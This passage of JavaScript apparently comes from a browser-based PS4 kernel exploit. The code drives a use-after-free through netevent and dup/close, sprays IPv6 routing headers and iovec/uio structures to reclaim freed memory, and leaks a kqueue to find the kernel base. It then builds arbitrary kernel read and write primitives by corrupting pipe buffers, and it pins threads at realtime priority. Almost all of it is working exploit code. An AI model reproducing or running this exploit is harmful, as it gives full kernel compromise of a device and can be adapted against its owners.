        const bf = p.read8(mc.add32(8));
        let wm = null, wv = null, wl = null;
        for (let k = 1; k <= 8; ++k) {
          const val = p.read8(bf.sub32(8 * k));
          if (!ptrish(val)) continue;
          const inl = p.read8(val.add32(16));
          const len = p.read4(val.add32(24)) >>> 0;
          if (inl.hi === 0 && inl.low === 2) {
            if (!wl) wl = val;
          } else if (inl.hi > 0 && len === 6) {
            if (!wm) wm = val;
          } else if (inl.hi > 0 && len === 48) {
            if (!wv) wv = val;
          }
        }
        if (!(wm && wv && wl)) throw new Error(name + ": shapes not found");
        w.master = wm;
        w.origVector = p.read8(wm.add32(16));
        p.write8(wm.add32(16), wv);
        w.wired = true;
        await w.rpc("setup", 15e3, wl.low, wl.hi);
        await w.rpc("armPivot", 15e3, G.G0.low, G.G0.hi);
        w.armed = true;
        w.ctx = makeCtx();
      }
      check(
        "worker-came-arw",
        workers.length === TOTAL_WORKERS,
        workers.length + "/" + TOTAL_WORKERS
      );
      const iovWorkers = workers.slice(0, NUM_IOV_WORKER);
      const uioWorkers = workers.slice(NUM_IOV_WORKER);
      mark("WORKER-POOLS", "iov=" + iovWorkers.length + " uio=" + uioWorkers.length);
      const prioAb = new ArrayBuffer(8), maskAb = new ArrayBuffer(16);
      keepAlive2.push(prioAb, maskAb);
      const prioAddr = bufAddr(prioAb), maskAddr = bufAddr(maskAb);
      const prioDv = new DataView(prioAb), maskDv = new DataView(maskAb);
      new Uint8Array(maskAb).fill(0);
      sc(
        SYS.cpuset_getaffinity,
        CPU_LEVEL_WHICH,
        CPU_WHICH_TID,
        new int64(4294967295, 4294967295),
        16,
        maskAddr
      );
      savedMask = new int64(maskDv.getUint32(0, true), maskDv.getUint32(4, true));
      prioDv.setUint16(0, 65535, true);
      prioDv.setUint16(2, 65535, true);
      sc(SYS.rtprio_thread, RTP_LOOKUP, 0, prioAddr);
      savedPrio = [prioDv.getUint16(0, true), prioDv.getUint16(2, true)];
      async function restoreThreadAttrs(why) {
        if (attrsRestored || !savedMask || !savedPrio) return;
        attrsRestored = true;
        const ID = new int64(4294967295, 4294967295);
        new Uint8Array(maskAb).fill(0);
        maskDv.setUint32(0, savedMask.low, true);
        maskDv.setUint32(4, savedMask.hi, true);
        const ar = sc(
          SYS.cpuset_setaffinity,
          CPU_LEVEL_WHICH,
          CPU_WHICH_TID,
          ID,
          16,
          maskAddr
        ).i32;
        prioDv.setUint16(0, savedPrio[0], true);
        prioDv.setUint16(2, savedPrio[1], true);
        const pr = sc(SYS.rtprio_thread, RTP_SET, 0, prioAddr).i32;
        new Uint8Array(maskAb).fill(0);
        sc(
          SYS.cpuset_getaffinity,
          CPU_LEVEL_WHICH,
          CPU_WHICH_TID,
          ID,
          16,
          maskAddr
        );
        const backMask = new int64(
          maskDv.getUint32(0, true),
          maskDv.getUint32(4, true)
        );
        prioDv.setUint16(0, 65535, true);
        prioDv.setUint16(2, 65535, true);
        sc(SYS.rtprio_thread, RTP_LOOKUP, 0, prioAddr);
        const backPrio = [prioDv.getUint16(0, true), prioDv.getUint16(2, true)];
        const good = backMask.low === savedMask.low && backMask.hi === savedMask.hi && backPrio[0] === savedPrio[0] && backPrio[1] === savedPrio[1];
        mark("THREAD-ATTRS-RESTORED", "at=" + why + " affinity=" + ar + " rtprio=" + pr + " mask=" + backMask + " prio={" + backPrio + "} wanted=" + savedMask + " {" + savedPrio + "}");
        check("thread-attrs-restored-power-off-safe", good, "");
        let wr = 0, wn = 0;
        for (const w of workers) {
          try {
            if (!w.armed) continue;
            wn++;
            new Uint8Array(maskAb).fill(255);
            await fireW(
              w,
              SYS.cpuset_setaffinity,
              [CPU_LEVEL_WHICH, CPU_WHICH_TID, ID, 16, maskAddr],
              5e3
            );
            prioDv.setUint16(0, RTP_PRIO_NORMAL, true);
            prioDv.setUint16(2, 0, true);
            await fireW(w, SYS.rtprio_thread, [RTP_SET, 0, prioAddr], 5e3);
            wr++;
          } catch (e) {
          }
        }
        mark("WORKER-ATTRS-RESTORED", "at=" + why + " n=" + wr + "/" + wn);
      }
      restoreCtx = { restore: restoreThreadAttrs };
      mark("THREAD-ATTRS-SAVED", "mask=" + savedMask + " rtprio={" + savedPrio + "}");
      prioDv.setUint16(0, RTP_PRIO_REALTIME, true);
      prioDv.setUint16(2, RTP, true);
      new Uint8Array(maskAb).fill(0);
      maskDv.setUint32(0, 1 << MAIN_CORE, true);
      {
        const a = sc(
          SYS.cpuset_setaffinity,
          CPU_LEVEL_WHICH,
          CPU_WHICH_TID,
          new int64(4294967295, 4294967295),
          16,
          maskAddr
        ).i32;
        const r = sc(SYS.rtprio_thread, RTP_SET, 0, prioAddr).i32;
        check(
          "main-thread-pinned-realtime",
          a === 0 && r === 0,
          "core=" + MAIN_CORE + " rtp=" + RTP + " affinity=" + a + " rtprio=" + r
        );
      }
      for (const w of workers) {
        await fireW(w, SYS.cpuset_setaffinity, [
          CPU_LEVEL_WHICH,
          CPU_WHICH_TID,
          new int64(4294967295, 4294967295),
          16,
          maskAddr
        ]);
        await fireW(w, SYS.rtprio_thread, [RTP_SET, 0, prioAddr]);
      }
      mark("WORKERS-PINNED", "n=" + workers.length + " core=" + MAIN_CORE + " rtp=" + RTP);
      const sprayOk = new Array(NUM_IPV6_SOCK).fill(false);
      let bootErr = "";
      const boot = bootFingerprint();
      mark("BOOT", boot || bootErr);
      let lastCommitted = null;
      try {
        lastCommitted = localStorage.getItem("ps4lab_committed_boot");
      } catch (e) {
      }
      if (boot && lastCommitted === boot && params.get("force") !== "1") {
        mark("REFUSING-TO-ARM", "reason=not-rebooted-since-last-committed-run");
        check(
          "console-rebooted-since-last-committed",
          false,
          "boot=" + boot + " last=" + lastCommitted + " override=?force=1"
        );
        state("REBOOT FIRST -- this kernel is still poisoned", "bad");
        hostFail();
        return;
      }
      check(
        "console-rebooted-since-last-committed",
        true,
        "boot=" + (boot || "none") + " last=" + (lastCommitted || "none")
      );
      let twins = null, triplets = null;
      let uncontained = null;
      for (let attempt = 1; attempt <= NUM_ATTEMPT && !triplets; ++attempt) {
        let fireTracked = function(w) {
          const t = fireW(w, SYS.recvmsg, [iovSs[0], msgAddr, 0], 0);
          t.settled = false;
          t.then(() => {
            t.settled = true;
          }, () => {
            t.settled = true;
          });
          return t;
        };
        if (uncontained) {
          mark("NO-RETRY-UNCONTAINED", "attempt=" + attempt + " reason=" + uncontained);
          break;
        }
        state("attempt " + attempt + "...", "warn");
        mark("ATTEMPT", attempt + "/" + NUM_ATTEMPT);
        const dummy = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
        if (dummy === -1) {
          mark("ATTEMPT-SKIP", "socket failed");
          continue;
        }
        const reg = netevent(dummy, NETEVENT_SET_QUEUE);
        if (reg.rv === -1) {
          mark("ATTEMPT-SKIP", "SET_QUEUE rv=-1 errno=" + reg.err);
          sc(SYS.close, dummy);
          continue;
        }
        sc(SYS.close, dummy);
        sc(SYS.setuid, 1);
        uafSock = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
        if (uafSock !== dummy) {
          mark("ATTEMPT-SKIP", "fd not reclaimed: wanted " + dummy + " got " + uafSock);
          if (uafSock !== -1) sc(SYS.close, uafSock);
          uafSock = 0;
          continue;
        }
        sc(SYS.setuid, 1);
        const clr = netevent(uafSock, NETEVENT_CLEAR_QUEUE);
        mark("UAF-ARMED", "fd=" + uafSock + " clear_rv=" + clr.rv);
        committed = true;
        try {
          if (boot) localStorage.setItem("ps4lab_committed_boot", boot);
        } catch (e) {
        }
        for (let i = 0; i < 128; ++i) sc(SYS.sendmsg, 0, msgAddr, 0);
        if (STOP_BEFORE_DOUBLE) {
          mark("STOP-BEFORE-DOUBLE", "withheld=dup+close");
          rebootRequired = true;
          break;
        }
        const d1 = sc(SYS.dup, uafSock).i32;
        if (d1 === -1) {
          mark("ATTEMPT-SKIP", "dup failed");
          rebootRequired = true;
          continue;
        }
        sc(SYS.close, d1);
        rebootRequired = true;
        mark("DOUBLE-FREE", "dup=" + d1 + " closed");
        twins = findTwins(MAX_ROUNDS_TWIN);
        if (!twins) {
          if (uafSock > 0) {
            sc(SYS.close, uafSock);
            uafSock = 0;
          }
          mark("ATTEMPT-RETRY", "after=no-twins next=" + (attempt + 1) + "/" + NUM_ATTEMPT);
          continue;
        }
        mark("TWINS", "a=" + twins.a + " b=" + twins.b + " round=" + twins.round);
        freeRthdr(twins.b);
        let reclaimed = false, rounds = 0;
        const tasks = new Array(iovWorkers.length);
        let parkedSeen = -1;
        for (let i = 0; i < NUM_IOV_SPRAY && !reclaimed; ++i) {
          rounds = i + 1;
          for (let k = 0; k < iovWorkers.length; ++k) tasks[k] = fireTracked(iovWorkers[k]);
          sc(SYS.sched_yield);
          if (parkedSeen < 0) {
            await new Promise((r) => setTimeout(r, 0));
            parkedSeen = tasks.filter((t) => !t.settled).length;
            mark("IOV-PARKED", parkedSeen + "/" + iovWorkers.length);
          }
          if (getRthdr(twins.a, IP6_RTHDR0_SIZE, 8) >= 0 && leakDv.getInt32(0, true) === 1) {
            reclaimed = true;
            break;
          }
          for (let k = 0; k < iovWorkers.length; ++k)
            sc(SYS.write, iovSs[1], scratch, 1);
          await Promise.all(tasks);
          for (let k = 0; k < iovWorkers.length; ++k)
            sc(SYS.read, iovSs[0], scratch, 1);
        }
        const rets = tasks.map(function(t, k) {
          return iovWorkers[k].ctx.frameDv.getInt32(0, true);
        });
        mark("IOV-RETS", "rounds=" + rounds + " recvmsg_rv=" + rets.join(","));
        check(
          "cr_refcnt-driven-1",
          reclaimed,
          "rounds=" + rounds + " parked=" + parkedSeen + "/" + iovWorkers.length
        );
        if (!reclaimed) {
          for (let k = 0; k < iovWorkers.length; ++k)
            sc(SYS.write, iovSs[1], scratch, 1);
          await Promise.all(tasks);
          for (let k = 0; k < iovWorkers.length; ++k)
            sc(SYS.read, iovSs[0], scratch, 1);
          burn(twins.a, "refcount-drive");
          burn(twins.b, "refcount-drive");
          twins = null;
          if (uafSock > 0) {
            sc(SYS.close, uafSock);
            uafSock = 0;
          }
          mark("ATTEMPT-RETRY", "after=refcount-drive burned=" + burned.size + " next=" + (attempt + 1) + "/" + NUM_ATTEMPT);
          continue;
        }
        const d2 = sc(SYS.dup, uafSock).i32;
        if (d2 === -1) {
          mark("ATTEMPT-SKIP", "second dup failed");
          break;
        }
        sc(SYS.close, d2);
        mark("TRIPLE-FREE", "dup=" + d2 + " closed");
        const t0 = twins.a;
        const ptOk = getRthdr(t0, IP6_RTHDR0_SIZE, 8) >= 0;
        mark("POST-TRIPLE", "master=" + t0 + " twin=" + twins.b + " idx=" + (ptOk ? leakDv.getInt32(4, true) : "readfail") + " refcnt=" + (ptOk ? leakDv.getInt32(0, true) : "readfail"));
        const t1 = findTriplet(t0, -1, "T1", MAX_ROUNDS_TRIPLET);
        for (let k = 0; k < iovWorkers.length; ++k)
          sc(SYS.write, iovSs[1], scratch, 1);
        await Promise.all(tasks);
        for (let k = 0; k < iovWorkers.length; ++k)
          sc(SYS.read, iovSs[0], scratch, 1);
        const rets2 = tasks.map(function(t, k) {
          return iovWorkers[k].ctx.frameDv.getInt32(0, true);
        });
        const irOk = getRthdr(t0, IP6_RTHDR0_SIZE, 8) >= 0;
        mark("IOV-RELEASED", "recvmsg_rv=" + rets2.join(",") + " master_idx=" + (irOk ? leakDv.getInt32(4, true) : "readfail"));
        const t2 = findTriplet(t0, t1, "T2", MAX_ROUNDS_TRIPLET);
        if (t1 && t2) {
          triplets = [t0, t1, t2];
          mark("TRIPLETS", triplets.join(","));
        } else {
          mark("TRIPLET-MISS", "t1=" + t1 + " t2=" + t2);
          burn(t0, "triplet-miss");
          if (t1) burn(t1, "triplet-miss");
          if (twins && twins.b) burn(twins.b, "triplet-miss");
          uncontained = "triplet-miss";
        }
      }
      check(
        "ucred-triple-freed",
        !!triplets,
        triplets ? triplets.join(",") : ""
      );
      let kernelBase = null, kqFdp = null, kqFd = -1;
      if (triplets) {
        if (off.k_kl_lock === void 0 || off.k_kl_lock === 0) {
          mark("KQUEUE-SKIPPED", "reason=no-k_kl_lock");
        } else {
          state("leaking a kqueue...", "warn");
          freeRthdr(triplets[2]);
          sc(SYS.sched_yield);
          sc(SYS.sched_yield);
          let leaked = false, tries = 0, magicNoFdp = 0, shortRead = 0;
          const held = [];
          for (let i = 0; i < NUM_LEAK_KQUEUE; ++i) {
            tries = i + 1;
            const kq = sc(SYS.kqueue).i32;
            if (kq === -1) {
              mark("KQUEUE-EMFILE", "at=" + i + " held=" + held.length);
              while (held.length) sc(SYS.close, held.pop());
              sc(SYS.sched_yield);
              continue;
            }
            held.push(kq);
            const got = getRthdr(triplets[0], KQUEUE_SIZE, 160);
            if (got < 160) shortRead++;
            const fdpLo = leakDv.getUint32(152, true);
            const fdpHi = leakDv.getUint32(156, true);
            const magicOk = got >= 160 && leakDv.getUint32(8, true) === KQ_HDR_MAGIC && leakDv.getUint32(12, true) === 0;
            if (magicOk && (fdpLo !== 0 || fdpHi !== 0)) {
              kqFd = held.pop();
              leaked = true;
              break;
            }
            if (magicOk) magicNoFdp++;
            if (held.length >= KQ_BATCH) {
              while (held.length) sc(SYS.close, held.pop());
              sc(SYS.sched_yield);
            }
            if (i && i % 500 === 0)
              mark("KQUEUE-ROUND", "i=" + i + " magic_no_fdp=" + magicNoFdp + " short=" + shortRead);
          }
          while (held.length) sc(SYS.close, held.pop());
          check(
            "kqueue-reclaimed-freed-chunk",
            leaked,
            "tries=" + tries + " magic_no_fdp=" + magicNoFdp + " short_reads=" + shortRead + (leaked ? " fd=" + kqFd : "")
          );
          if (leaked) {
            const klLock = new int64(
              leakDv.getUint32(96, true),
              leakDv.getUint32(100, true)
            );
            kqFdp = new int64(
              leakDv.getUint32(152, true),
              leakDv.getUint32(156, true)
            );
            kernelBase = klLock.sub32(off.k_kl_lock);
            mark("KQUEUE-LEAK", "kl_lock=" + klLock + " kq_fdp=" + kqFdp);
            mark("KERNEL-BASE", kernelBase + " = kl_lock-0x" + off.k_kl_lock.toString(16));
            try {
              const kbNow = "" + kernelBase;
              const kbLast = localStorage.getItem("ps4lab_kernel_base");
              if (kbLast === kbNow)
                mark("SAME-BOOT-AS-LAST-RUN", "kernel_base=" + kbNow);
              localStorage.setItem("ps4lab_kernel_base", kbNow);
            } catch (e) {
            }
            check(
              "kl_lock-kq_fdp-kernel-pointers",
              klLock.hi >>> 0 === 4294967295 && kqFdp.hi >>> 0 >= 4294901760,
              "kl_lock.hi=" + hx(klLock.hi) + " kq_fdp.hi=" + hx(kqFdp.hi)
            );
            check(
              "kernel-base-0x4000-aligned",
              (kernelBase.low & 16383) === 0,
              "low=" + hx(kernelBase.low)
            );
            sc(SYS.close, kqFd);
            triplets[2] = findTriplet(triplets[0], triplets[1], "KQ", MAX_ROUNDS_TRIPLET);
            mark("POST-KQUEUE", "kq_fd=" + kqFd + " closed triplets=" + triplets.join(","));
            check(
              "triplets2-re-found-after-kqueue-leak",
              !!triplets[2],
              triplets.join(",")
            );
          }
        }
      }
      async function landUio(size, forWrite, tasks) {
        if (!tripletsUsable()) {
          mark("UIO-LAND-REFUSED", "triplets=" + triplets.join(","));
          return null;
        }
        trace("UIO-LAND", "call=" + (forWrite ? "readv" : "writev") + " size=" + size);
        freeRthdr(triplets[2]);
        const uioDeadline = Date.now() + (params.has("uioms") ? parseInt(params.get("uioms"), 10) : 3e4);
        for (let i = 0; i < NUM_UIO_SPRAY; ++i) {
          if ((i & 63) === 0 && Date.now() > uioDeadline) {
            mark("UIO-LAND-TIMEOUT", "rounds=" + i);
            break;
          }
          if (i && i % 256 === 0) mark("UIO-LAND-ROUND", "i=" + i);
          for (let k = 0; k < uioWorkers.length; ++k)
            tasks[k] = fireW(
              uioWorkers[k],
              forWrite ? SYS.readv : SYS.writev,
              [forWrite ? uioSs[0] : uioSs[1], uioIovAddr, NUM_UIO_IOV],
              0
            );
          sc(SYS.sched_yield);
          if (getRthdr(triplets[0], IOVEC_SIZE) >= 0 && leakDv.getInt32(8, true) === NUM_UIO_IOV) {
            return new int64(
              leakDv.getUint32(0, true),
              leakDv.getUint32(4, true)
            );
          }
          if (forWrite) {
            for (let k = 0; k < uioWorkers.length; ++k)
              sc(SYS.write, uioSs[1], scratch, size);
          } else {
            sc(SYS.read, uioSs[0], scratch, size);
            for (let k = 0; k < uioWorkers.length; ++k)
              sc(SYS.read, uioSs[0], scratch, size);
          }
          await Promise.all(tasks);
          if (!forWrite) sc(SYS.write, uioSs[1], scratch, size);
        }
        return null;
      }
      async function landFakeUio(tasks) {
        if (!tripletsUsable()) {
          mark("FAKEUIO-REFUSED", "triplets=" + triplets.join(","));
          return false;
        }
        trace("FAKEUIO-LAND", "target=" + triplets[0] + " freed=" + triplets[1]);
        freeRthdr(triplets[1]);
        const fakeDeadline = Date.now() + (params.has("fakeuioms") ? parseInt(params.get("fakeuioms"), 10) : 3e4);
        for (let i = 0; i < NUM_IOV_SPRAY_MAX; ++i) {
          if ((i & 63) === 0 && Date.now() > fakeDeadline) {
            mark("FAKEUIO-TIMEOUT", "rounds=" + i);
            break;
          }
          if (i && i % 500 === 0) mark("FAKEUIO-ROUND", "i=" + i);
          for (let k = 0; k < iovWorkers.length; ++k)
            tasks[k] = fireW(
              iovWorkers[k],
              SYS.recvmsg,
              [iovSs[0], msgAddr, 0],
              0
            );
          sc(SYS.sched_yield);
          if (getRthdr(triplets[0], UIO_SIZE + IOVEC_SIZE) >= 0 && leakDv.getUint32(32, true) === UIO_SYSSPACE) return true;
          for (let k = 0; k < iovWorkers.length; ++k)
            sc(SYS.write, iovSs[1], scratch, 1);
          await Promise.all(tasks);
          for (let k = 0; k < iovWorkers.length; ++k)
            sc(SYS.read, iovSs[0], scratch, 1);
        }
        return false;
      }
      async function releaseIov(itasks) {
        for (let k = 0; k < iovWorkers.length; ++k)
          sc(SYS.write, iovSs[1], scratch, 1);
        await Promise.all(itasks);
        for (let k = 0; k < iovWorkers.length; ++k)
          sc(SYS.read, iovSs[0], scratch, 1);
      }
      async function refindTriplets(itasks) {
        await releaseIov(itasks);
        if (refindPair("RE")) return true;
        mark("TRIPLETS-LOST", "triplets=" + triplets.join(","));
        return false;
      }
      async function unwind(utasks, itasks, why, wakeUio, size, drainReads) {
        mark("KREAD-UNWIND", "why=" + why + " wake_uio=" + (wakeUio ? 1 : 0));
        try {
          if (wakeUio && utasks && utasks[0]) {
            const dsz = size || 8;
            for (let k = 0; k < (drainReads || 0); ++k)
              sc(SYS.read, uioSs[0], scratch, dsz);
            await Promise.all(utasks);
          }
        } catch (e) {
          mark("UNWIND-UIO-THREW", e.message);
        }
        try {
          if (itasks && itasks[0]) await releaseIov(itasks);
        } catch (e) {
          mark("UNWIND-IOV-THREW", e.message);
        }
        restoreRefcntIov();
        const ok = refindPair("UW");
        mark("KREAD-UNWOUND", "triplets=" + triplets.join(",") + " usable=" + ok);
        return ok;
      }
      const isKptr = (v) => !!v && v.hi >>> 0 >= 4294901760;
      const kAligned = (v) => !!v && (v.low >>> 0 & 7) === 0;
      async function kreadSlow(addr, size, pairs) {
        if (kreadPoisoned) {
          mark("KREAD-REFUSED", "reason=poisoned");
          return null;
        }
        if (pairs) {
          for (const q of pairs) if (!kaddrOk(q.addr)) {
            mark("KREAD-REFUSED", "bad-pair-addr=" + q.addr);
            return null;
          }
        } else if (!kaddrOk(addr)) {
          mark("KREAD-REFUSED", "bad-addr=" + addr);
          return null;
        }
        if (!tripletsUsable()) {
          mark("KREAD-REFUSED", "triplets=" + triplets.join(","));
          return null;
        }
        if (pairs && pairs.length > NUM_UIO_IOV) {
          mark("KREAD-REFUSED", "pairs=" + pairs.length + " > " + NUM_UIO_IOV);
          return null;
        }
        mark("KREAD-BEGIN", "addr=" + (pairs ? pairs.map((p2) => "" + p2.addr).join("+") : addr) + " size=" + size);
        const bufs = uioWorkers.map(function() {
          const ab = new ArrayBuffer(size);
          keepAlive2.push(ab);
          new Uint8Array(ab).fill(65);
          return { ab, addr: bufAddr(ab), dv: new DataView(ab) };
        });
        lenDv.setUint32(0, size, true);
        sc(SYS.setsockopt, uioSs[1], SOL_SOCKET, SO_SNDBUF, lenAddr, 4);
        sc(SYS.write, uioSs[1], scratch, size);
        put(uioIovDv, 8, size);
        const utasks = new Array(uioWorkers.length);
        const uioIov = await landUio(size, false, utasks);
        if (!uioIov) {
          await unwind(utasks, null, "no-uio", true, size, 1);
          return null;
        }
        trace("UIO-LANDED", "uio_iov=" + uioIov);
        fakeUio(uioIov, size, UIO_WRITE);
        if (pairs) {
          for (let i = 0; i < pairs.length; ++i) {
            put(iovDv, 48 + IOVEC_SIZE * i, pairs[i].addr);
            put(iovDv, 56 + IOVEC_SIZE * i, pairs[i].size);
          }
        } else {
          put(iovDv, 48, addr);
          put(iovDv, 56, size);
        }
        const itasks = new Array(iovWorkers.length);
        const ok = await landFakeUio(itasks);
        if (!ok) {
          kreadPoisoned = true;
          await unwind(utasks, itasks, "no-fake-uio", false, size);
          return null;
        }
        trace("KREAD-WAKE", "src=" + addr);
        sc(SYS.read, uioSs[0], scratch, size);
        let got = null, drained = 0;
        for (const b of bufs) {
          sc(SYS.read, uioSs[0], b.addr, size);
          drained++;
          if (!got && !(b.dv.getUint32(0, true) === 1094795585 && b.dv.getUint32(4, true) === 1094795585)) got = b.dv;
        }
        trace("KREAD-DRAINED", "bufs=" + drained + "/" + bufs.length + " hit=" + (got ? 1 : 0));
        await Promise.all(utasks);
        trace("KREAD-UIO-JOINED", "");
        restoreRefcntIov();
        await refindTriplets(itasks);
        return got;
      }
      async function kwriteSlow(dst, srcAddr, size) {
        if (kreadPoisoned) {
          mark("KWRITE-REFUSED", "reason=poisoned");
          return false;
        }
        if (!kaddrOk(dst)) {
          mark("KWRITE-REFUSED", "bad-dst=" + dst);
          return false;
        }
        if (!tripletsUsable()) {
          mark("KWRITE-REFUSED", "triplets=" + triplets.join(","));
          return false;
        }
        mark("KWRITE-BEGIN", "dst=" + dst + " size=" + size);
        lenDv.setUint32(0, size, true);
        sc(SYS.setsockopt, uioSs[1], SOL_SOCKET, SO_SNDBUF, lenAddr, 4);
        put(uioIovDv, 8, size);
        const utasks = new Array(uioWorkers.length);
        const uioIov = await landUio(size, true, utasks);
        if (!uioIov) {
          await unwind(utasks, null, "no-uio", true, size, 0);
          return false;
        }
        fakeUio(uioIov, size, UIO_READ);
        put(iovDv, 48, dst);
        put(iovDv, 56, size);
        const itasks = new Array(iovWorkers.length);
        const ok = await landFakeUio(itasks);
        if (!ok) {
          kreadPoisoned = true;
          await unwind(utasks, itasks, "no-fake-uio", false, size);
          return false;
        }
        for (let k = 0; k < uioWorkers.length; ++k)
          sc(SYS.write, uioSs[1], srcAddr, size);
        await Promise.all(utasks);
        restoreRefcntIov();
        await refindTriplets(itasks);
        return true;
      }
      const R1_ON = params.get("r1") !== "0";
      if (!R1_ON && kernelBase && triplets) {
        state("kread_slow...", "warn");
        const got = await kreadSlow(kernelBase, 32);
        if (got) {
          const b = [];
          for (let i = 0; i < 16; ++i) b.push(got.getUint8(i));
          mark("KREAD", "kernel_base -> " + b.map((v) => v.toString(16).padStart(2, "0")).join(" "));
          check(
            "kread_slow-reads-kernel-elf-header",
            got.getUint32(0, true) === 1179403647,
            "e_type=" + got.getUint16(16, true) + " e_machine=" + hx(got.getUint16(18, true))
          );
        } else check("kread_slow-returned-data", false, "");
      }
      let kv = null;
      if (kernelBase && triplets && kqFdp) {
        state("make_karw...", "warn");
        mark("SHORT-READS", "n=" + shortReads + " gate=" + (R2_ON ? 1 : 0));
        const KREAD_TRIES = params.has("kreadtries") ? parseInt(params.get("kreadtries"), 10) : 4;
        async function kread8(a) {
          for (let t = 0; t < KREAD_TRIES; ++t) {
            if (t) mark("KREAD-RETRY", "addr=" + a + " try=" + (t + 1));
            const dv = await kreadSlow(a, 8);
            if (dv) return new int64(
              dv.getUint32(0, true),
              dv.getUint32(4, true)
            );
            if (kreadPoisoned || !tripletsUsable()) break;
          }
          return null;
        }
        async function kwrite8n(dst, srcAddr, n) {
          for (let t = 0; t < KREAD_TRIES; ++t) {
            if (t) mark("KWRITE-RETRY", "dst=" + dst + " try=" + (t + 1));
            if (await kwriteSlow(dst, srcAddr, n)) return true;
            if (kreadPoisoned || !tripletsUsable()) break;
          }
          return false;
        }
        const qw = (dv, o) => new int64(
          dv.getUint32(o, true),
          dv.getUint32(o + 4, true)
        );
        async function kreadN(a, n) {
          for (let t = 0; t < KREAD_TRIES; ++t) {
            if (t) mark("KREAD-RETRY", "addr=" + a + " n=" + n + " try=" + (t + 1));
            const dv = await kreadSlow(a, n);
            if (dv) return dv;
            if (kreadPoisoned || !tripletsUsable()) break;
          }
          return null;
        }
        async function kreadPairs(pairs) {
          let total = 0;
          for (const p2 of pairs) total += p2.size;
          for (let t = 0; t < KREAD_TRIES; ++t) {
            if (t) mark("KREAD-RETRY", "pairs=" + pairs.length + " try=" + (t + 1));
            const dv = await kreadSlow(null, total, pairs);
            if (dv) return dv;
            if (kreadPoisoned || !tripletsUsable()) break;
          }
          return null;
        }
        const R3_ON = params.get("r3") !== "0";
        const R4_ON = params.get("r4") !== "0";
        const fdtOfiles = await kread8(kqFdp);
        mark("FDT-OFILES", "" + fdtOfiles);
        let mFp = null, sFp = null;
        const fdDelta = slavePipe[0] - masterPipe[0];
        const spanOk = R3_ON && fdtOfiles && fdDelta > 0 && (fdDelta + 1) * FILEDESCENT_SIZE <= 32;
        if (spanOk) {
          const span = await kreadN(
            fdtOfiles.add32(masterPipe[0] * FILEDESCENT_SIZE),
            32
          );
          if (span) {
            mFp = qw(span, 0);
            sFp = qw(span, fdDelta * FILEDESCENT_SIZE);
          } else mark("PIPE-FP-SPAN-MISS", "delta=" + fdDelta);
        }
        if (!mFp && fdtOfiles && !kreadPoisoned && tripletsUsable()) {
          if (spanOk) mark("PIPE-FP-FALLBACK", "two single reads");
          mFp = await kread8(
            fdtOfiles.add32(masterPipe[0] * FILEDESCENT_SIZE)
          );
          sFp = await kread8(
            fdtOfiles.add32(slavePipe[0] * FILEDESCENT_SIZE)
          );
        }
        mark("PIPE-FP", "master=" + (mFp || "?") + " slave=" + (sFp || "?") + " delta=" + fdDelta + " span=" + (spanOk ? 1 : 0));
        let mData = null, sData = null;
        if (R4_ON && mFp && sFp) {
          const both = await kreadPairs([
            { addr: mFp, size: 8 },
            { addr: sFp, size: 8 }
          ]);
          if (both) {
            mData = qw(both, 0);
            sData = qw(both, 8);
          } else mark("PIPE-FDATA-SCATTER-MISS", "");
        }
        if (!mData && !kreadPoisoned && tripletsUsable()) {
          if (R4_ON && mFp && sFp) mark("PIPE-FDATA-FALLBACK", "two reads");
          mData = mFp ? await kread8(mFp) : null;
          sData = sFp ? await kread8(sFp) : null;
        }
        mark("PIPE-FDATA", "master=" + (mData || "?") + " slave=" + (sData || "?"));
        const kptr = (v) => v && v.hi >>> 0 >= 4294901760;
        if (kptr(mData) && kptr(sData) && mData.low === sData.low && mData.hi === sData.hi) {
          check("pipe-fdata-distinct", false, "both=" + mData);
          mark("MAKE-KARW-ABORTED", "reason=mdata-equals-sdata");
          mData = null;
        }
        if (!check(
          "ofiles-walk-reached-pipes",
          kptr(fdtOfiles) && kptr(mFp) && kptr(sFp) && kptr(mData) && kptr(sData),
          ""
        )) {
          mark("MAKE-KARW-ABORTED", "reason=walk-not-kernel-pointers");
        } else {
          const pbAb = new ArrayBuffer(PIPEBUF_SIZEOF);
          keepAlive2.push(pbAb);
          const pbAddr = bufAddr(pbAb), pbDv = new DataView(pbAb);
          new Uint8Array(pbAb).fill(0);
          pbDv.setUint32(12, PIPE_PAGE, true);
          put(pbDv, 16, sData);
          mark("PIPEBUF-AIM", "at=" + mData + " size=0x" + PIPE_PAGE.toString(16) + " buffer=" + sData);
          const wrote = await kwrite8n(mData, pbAddr, PIPEBUF_SIZEOF);
          check("pipebuf-written-master-struct-pipe", wrote, "");
          if (wrote) {
            let kview = function(base) {
              return {
                getBInt: function(o) {
                  return kv.read8(base.add32(o));
                },
                setBInt: function(o, v) {
                  new Uint8Array(kvwAb).fill(0);
                  put(kvwDv, 0, v);
                  kv.kwrite(base.add32(o), kvwAddr, 8);
                },
                getInt32: function(o) {
                  new Uint8Array(kvwAb).fill(0);
                  kv.kread(kvwAddr, base.add32(o), 4);
                  return kvwDv.getInt32(0, true);
                },
                setInt32: function(o, v) {
                  new Uint8Array(kvwAb).fill(0);
                  kvwDv.setInt32(0, v, true);
                  kv.kwrite(base.add32(o), kvwAddr, 4);
                },
                setUint8: function(o, v) {
                  new Uint8Array(kvwAb).fill(0);
                  kvwDv.setUint8(0, v);
                  kv.kwrite(base.add32(o), kvwAddr, 1);
                }
              };
            }, fput = function(fd, v) {
              new Uint8Array(kvwAb).fill(0);
              put(kvwDv, 0, v);
              kv.kwrite(fdtOfiles.add32(fd * FILEDESCENT_SIZE), kvwAddr, 8);
            }, fhold = function(fp) {
              const before = kview(fp).getInt32(40);
              if (before <= 0 || before > 65535) return { before, after: before };
              let after = before;
              for (let bump = 1; bump <= 4; ++bump) {
                kview(fp).setInt32(40, before + bump);
                after = kview(fp).getInt32(40);
                if (after > before && after >= 2) break;
              }
              return { before, after };
            }, removeRthdrFromSocket = function(fd) {
              const fp = fget(fd);
              if (!kptr2(fp)) return "badfp";
              const fData = kv.read8(fp);
              if (!kptr2(fData)) return "badfdata";
              const soPcb = kv.read8(fData.add32(24));
              if (!kptr2(soPcb)) return "badpcb";
              const opts = kv.read8(soPcb.add32(280));
              if (kptr2(opts)) dumpOpts.push({ fd, opts });
              if (!kptr2(opts)) return "noopts";
              const was = kview(opts).getBInt(104);
              kview(opts).setBInt(104, new int64(0, 0));
              const now = kview(opts).getBInt(104);
